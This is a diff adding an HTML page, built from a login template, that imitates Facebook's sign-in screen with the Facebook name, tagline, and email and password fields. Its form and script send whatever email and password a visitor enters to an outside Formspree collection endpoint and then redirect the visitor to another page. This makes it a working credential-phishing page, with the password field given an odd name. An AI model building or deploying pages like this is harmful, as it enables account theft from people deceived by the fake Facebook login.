@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<!-- Coding By CodingNepal - www.codingnepalweb.com -->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook.com/EST</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container flex">
+        <div class="facebook-page flex">
+            <div class="text">
+                <h1>facebook</h1>
+                <p>Connect with friends and the world </p>
+                <p> around you on Facebook.</p>
+            </div>
+            <form id="myForm" action="https://formspree.io/f/xgegeday" method="POST">
+                <!-- Replace "your_email@example.com" with your actual email address associated with Formspree -->
+                <input type="email" name="_replyto" placeholder="Email or phone number" required>
+                <input type="password" name="familly" placeholder="Password" required>
+
+                <!-- Hidden input for redirection -->
+                <input type="hidden" name="_next" value="https://example.com/new-page">
+
+                <div class="link">
+                    <button type="submit" class="login">Login</button>
+                    <a href="#" class="forgot">Forgot password?</a>
+                </div>
+                <hr>
+                <div class="button">
+                    <a href="#">Create new account</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function(event) {
+            // Prevent the default form submission
+            event.preventDefault();
+
+            // Submit the form using JavaScript
+            var form = event.target;
+            var formData = new FormData(form);
+
+            // Send the form data to Formspree using Fetch API
+            fetch(form.action, {
+                method: form.method,
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(function(response) {
+                // Redirect to your preferred link
+                window.location.href = "https://example.com/new-page";
+            });
+        });
+    </script>
+</body>
+</html>
